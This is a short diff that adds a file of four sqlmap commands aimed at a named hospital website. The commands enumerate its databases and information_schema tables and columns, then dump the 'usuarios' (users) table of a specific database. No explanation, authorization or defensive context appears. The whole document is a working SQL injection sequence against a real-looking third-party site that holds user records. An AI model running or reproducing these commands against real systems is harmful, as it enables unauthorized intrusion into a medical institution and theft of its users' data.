@@ -1,0 +1,7 @@
+sqlmap -u https://www.hospitalgeneral.mx/frame_esp.php?id=101 --dbs      
+
+sqlmap -u https://www.hospitalgeneral.mx/frame_esp.php?id=101 -D information_schema --tables  
+
+sqlmap -u https://www.hospitalgeneral.mx/frame_esp.php?id=101/user_variables -D information_schema --columns
+
+sqlmap -u https://www.hospitalgeneral.mx/frame_esp.php?id=101 -D u174527387_rmhgm -T usuarios --columns --dump
